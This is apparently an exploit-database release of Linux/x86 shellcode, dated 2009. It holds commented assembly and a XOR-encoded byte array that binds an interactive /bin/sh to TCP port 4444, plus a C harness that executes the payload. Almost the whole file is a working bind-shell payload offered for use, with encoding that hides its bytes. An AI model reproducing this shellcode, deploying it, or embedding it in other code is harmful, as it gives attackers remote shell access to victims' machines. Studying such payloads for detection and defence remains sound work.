/*
       Author: Rick
       Email: rick2600@hotmail.com

       OS: Linux/x86
       Description: Port Bind 4444 ( xor-encoded )


--------------------------------------------------------------------
section .text
    global _start

_start:

    ;socket (PF_INET, SOCK_STREAM, 0)
    push byte 0x66
    pop eax
    push byte 0x01
    pop ebx
    xor ecx, ecx
    push ecx
    push byte 0x01
    push byte 0x02
    mov ecx, esp
    int 0x80

    mov esi, eax	;save file descriptor

    ;bind (sockfd, server, len)
    xor edx, edx
    push edx
    push word 0x5c11
    push word 0x02
    mov ecx, esp
    push byte 0x10
    push ecx
    push eax
    mov ecx, esp
    mov bl, 0x02
    push byte 0x66
    pop eax
    int 0x80

    ;listen
    mov al, 0x66
    mov bl, 0x04
    int 0x80

    ;accept
    push edx
    push esi
    mov ecx, esp
    inc ebx
    push byte 0x66
    pop eax
    int 0x80

    mov ebx, eax	;save file descriptor

    ;dup2(sockfd, 2); dup2(sockfd, 1); dup2(sockfd, 0)
    push byte 0x02
    pop ecx
    do_dup:
        push byte 0x3f
        pop eax
        int 0x80
    loop do_dup
        push byte 0x3f
        pop eax
        int 0x80


    ; execve ("/bin/sh", ["/bin/sh", "-i"], 0);
    xor edx, edx
    push edx
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp
    push edx
    push word 0x692d
    mov ecx, esp
    push edx
    push ecx
    push ebx
    mov ecx, esp
    push byte 0x0b
    pop eax
    int 0x80

    ;exit(0)
    push byte 0x01
    pop eax
    xor ebx, ebx
    int 0x80
--------------------------------------------------------------------
*/

#include <stdio.h>
#include <string.h>



char code[] =
"\xeb\x12\x5b\x31\xc9\xb1\x75\x8a\x03\x34"
"\x1e\x88\x03\x43\x66\x49\x75\xf5\xeb\x05"
"\xe8\xe9\xff\xff\xff\x74\x78\x46\x74\x1f"
"\x45\x2f\xd7\x4f\x74\x1f\x74\x1c\x97\xff"
"\xd3\x9e\x97\xd8\x2f\xcc\x4c\x78\x76\x0f"
"\x42\x78\x76\x1c\x1e\x97\xff\x74\x0e\x4f"
"\x4e\x97\xff\xad\x1c\x74\x78\x46\xd3\x9e"
"\xae\x78\xad\x1a\xd3\x9e\x4c\x48\x97\xff"
"\x5d\x74\x78\x46\xd3\x9e\x97\xdd\x74\x1c"
"\x47\x74\x21\x46\xd3\x9e\xfc\xe7\x74\x21"
"\x46\xd3\x9e\x2f\xcc\x4c\x76\x70\x31\x6d"
"\x76\x76\x31\x31\x7c\x77\x97\xfd\x4c\x78"
"\x76\x33\x77\x97\xff\x4c\x4f\x4d\x97\xff"
"\x74\x15\x46\xd3\x9e\x74\x1f\x46\x2f\xc5"
"\xd3\x9e";



int main(void)
{
   printf("length: %d\n", strlen(code));

   void (*shellcode)();
   shellcode = (void *)code;
   shellcode();
   return (0);

}

// milw0rm.com [2009-07-10]